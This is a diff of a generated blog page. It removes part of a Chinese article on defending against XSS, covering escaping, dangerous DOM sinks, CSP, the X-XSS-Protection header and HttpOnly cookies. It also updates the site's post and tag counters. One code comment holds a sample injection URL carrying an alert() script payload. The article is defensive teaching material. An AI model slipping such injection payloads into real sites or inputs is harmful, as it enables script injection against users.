-<p><strong>DOM 型 XSS 跟前两种 XSS 的区别</strong>：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p>
-<h2 id="XSS攻击防范"><a href="#XSS攻击防范" class="headerlink" title="XSS攻击防范"></a>XSS攻击防范</h2><h3 id="预防存储型和反射型-XSS-攻击"><a href="#预防存储型和反射型-XSS-攻击" class="headerlink" title="预防存储型和反射型 XSS 攻击"></a>预防存储型和反射型 XSS 攻击</h3><p>存储型和反射型 XSS 都是在服务端取出恶意代码后，插入到响应 HTML 里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。</p>
-<p>预防这两种漏洞，有两种常见做法：</p>
-<ul>
-<li>改成纯前端渲染，把代码和数据分隔开。</li>
-<li>对 HTML 做充分转义。</li>
-</ul>
-<h4 id="纯前端渲染"><a href="#纯前端渲染" class="headerlink" title="纯前端渲染"></a>纯前端渲染</h4><p>纯前端渲染的过程：</p>
-<p>浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。<br>然后浏览器执行 HTML 中的 JavaScript。<br>JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。<br><strong>在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（.innerText），还是属性（.setAttribute），还是样式（.style）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。</strong></p>
-<p>但<strong>纯前端渲染还需注意避免 DOM 型 XSS 漏洞</strong>（例如 onload 事件和 href 中的 javascript:xxx 等，请参考下文”预防 DOM 型 XSS 攻击“部分）。</p>
-<p>在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 或者的问题。</p>
-<h4 id="HTML-转义"><a href="#HTML-转义" class="headerlink" title="HTML 转义"></a>HTML 转义</h4><p>如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。</p>
-<p>常用的模板引擎，如 doT.js、ejs、FreeMarker 等，对于 HTML 转义通常只有一个规则，就是把 &amp; &lt; &gt; “ ‘ / 这几个字符简单转义掉，确实能起到一定的 XSS 防护作用，但并不完善：</p>
-<table>
-<thead>
-<tr>
-<th>XSS 安全漏洞</th>
-<th>简单转义是否有防护作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>HTML 标签文字内容</td>
-<td>有</td>
-</tr>
-<tr>
-<td>HTML 属性值</td>
-<td>有</td>
-</tr>
-<tr>
-<td>CSS 内联样式</td>
-<td>无</td>
-</tr>
-<tr>
-<td>内联 JavaScript</td>
-<td>无</td>
-</tr>
-<tr>
-<td>内联 JSON</td>
-<td>无</td>
-</tr>
-<tr>
-<td>跳转链接</td>
-<td>无</td>
-</tr>
-</tbody></table>
-<p>所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。例如 Java 工程里常用的转义库为 org.owasp.encoder，如果是node项目可以用 <a href="https://jsxss.com/zh/index.html" target="_blank" rel="noopener">xss</a>。</p>
-<h3 id="预防-DOM-型-XSS-攻击（前端重点）"><a href="#预防-DOM-型-XSS-攻击（前端重点）" class="headerlink" title="预防 DOM 型 XSS 攻击（前端重点）"></a>预防 DOM 型 XSS 攻击（前端重点）</h3><p>DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。</p>
-<p>在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 .textContent、.setAttribute() 等。</p>
-<p>如果用 Vue/React 技术栈，在使用 v-html 时，也要注意避免 XSS 攻击，只在可信内容上使用 v-html。</p>
-<p>DOM 中的内联事件监听器，如 location、onclick、onerror、onload、onmouseover 等，<code>&lt;a&gt;</code> 标签的 href 属性，JavaScript 的 eval()、setTimeout()、setInterval() 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。</p>
-<h3 id="其他-XSS-防范措施"><a href="#其他-XSS-防范措施" class="headerlink" title="其他 XSS 防范措施"></a>其他 XSS 防范措施</h3><p>虽然在渲染页面和执行 JavaScript 时，通过谨慎的转义可以防止 XSS 的发生，但完全依靠开发的谨慎仍然是不够的。以下介绍一些通用的方案，可以降低 XSS 带来的风险和后果。</p>
-<ul>
-<li>HttpOnly Cookie</li>
-</ul>
-<h4 id="浏览器-XSS-过滤"><a href="#浏览器-XSS-过滤" class="headerlink" title="浏览器 XSS 过滤"></a>浏览器 XSS 过滤</h4><p>通过设置响应标头实现 XSS 过滤。配置语法如下：</p>
-<blockquote>
-<p>X-XSS-Protection: 0</p>
-</blockquote>
-<blockquote>
-<p>X-XSS-Protection: 1</p>
-</blockquote>
-<blockquote>
-<p>X-XSS-Protection: 1; mode=block</p>
-</blockquote>
-<blockquote>
-<p>X-XSS-Protection: 1; report=<reporting-uri></p>
-</blockquote>
-<ul>
-<li>0 关闭XSS过滤。</li>
-<li>1 启用XSS过滤（通常是浏览器默认的）。 如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）。</li>
-<li>1;mode=block 启用XSS过滤。 如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。</li>
-<li>1; report= <reporting-uri> (Chromium only)。启用XSS过滤。 如果检测到跨站脚本攻击，浏览器将清除页面并使用CSP <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri" target="_blank" rel="noopener">report-uri</a> 指令的功能发送违规报告。</li>
-</ul>
-<p>例如在koa框架中设置：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctx.set(<span class="string">'X-XSS-Protection'</span>, <span class="number">1</span>) <span class="comment">//0 关闭XSS过滤，1 启用 XSS 过滤（浏览器默认值）</span></span><br><span class="line"><span class="comment">// http://localhost:3000/?from=&lt;script&gt;alert(3)&lt;/script&gt; 可以拦截</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="内容安全策略"><a href="#内容安全策略" class="headerlink" title="内容安全策略"></a>内容安全策略</h3><p>内容安全策略 (CSP, Content Security Policy) 是一个附加的安全层，用于帮助检测和缓解某些类型的攻击，包括跨站脚本 (XSS) 和数据注入等攻击。</p>
-<p>CSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 只允许加载本站资源</span></span><br><span class="line">Content-Security-Policy: <span class="keyword">default</span>-src <span class="string">'self'</span></span><br><span class="line"><span class="comment">// 只允许加载 HTTPS 协议图片</span></span><br><span class="line">Content-Security-Policy: img-src https:<span class="comment">//*</span></span><br><span class="line"><span class="comment">// 不允许加载任何来源框架</span></span><br><span class="line">Content-Security-Policy: child-src <span class="string">'none'</span></span><br></pre></td></tr></table></figure>
-
-<p>更多配置详见：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy。" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy。</a></p>
-<h3 id="HttpOnly-Cookie"><a href="#HttpOnly-Cookie" class="headerlink" title="HttpOnly Cookie"></a>HttpOnly Cookie</h3><p>这是预防XSS攻击窃取用户cookie最有效的防御手段。Web应 用程序在设置cookie时，将其属性设为 HttpOnly，就可以避免该网页的cookie被客户端恶意JavaScript窃取，保护用户cookie信息。</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.addHeader(<span class="string">"Set-Cookie"</span>, <span class="string">"uid=112; Path=/; HttpOnly"</span>)</span><br></pre></td></tr></table></figure>
-
-<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
-<li>输入长度控制（增加 XSS 攻击的难度）</li>
-<li>验证码（防止脚本冒充用户提交危险操作）</li>
-</ul>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>XSS 攻击是一种代码注入攻击，主要分为3类：反射型、存储型和DOM型。反射型和存储型主要在后端通过HTML转义（通常使用html转移库）防御，或者采用纯前端渲染。</p>
-<p>在纯前端渲染中，我们要明确的告诉浏览器：下面要设置的内容是文本（.innerText），还是属性（.setAttribute），还是样式（.style）等等。这样浏览器不会被轻易的被欺骗，执行预期外的代码。纯前端渲染还需注意避免 DOM 型 XSS 漏洞，在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为 HTML 插到页面上。如果用 Vue/React 技术栈，在使用 v-html 时，也要注意避免 XSS 攻击，只在可信内容上使用 v-html。对于不可信的内容像后端一样通过HTML转义库来处理。</p>
-<p>此外，还有其他的xss防御措施包括：浏览器 XSS 过滤、内容安全策略、HttpOnly Cookie、输入长度控制和验证码等。</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
-<li><a href="https://tech.meituan.com/2018/09/27/fe-security.html" target="_blank" rel="noopener">前端安全系列（一）：如何防止XSS攻击？</a></li>
-<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy" target="_blank" rel="noopener">Content-Security-Policy</a></li>
-<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-XSS-Protection" target="_blank" rel="noopener">X-XSS-Protection</a></li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1611,7 +1515,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">37</span>
+          <span class="site-state-item-count">38</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1624,7 +1528,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-count">26</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
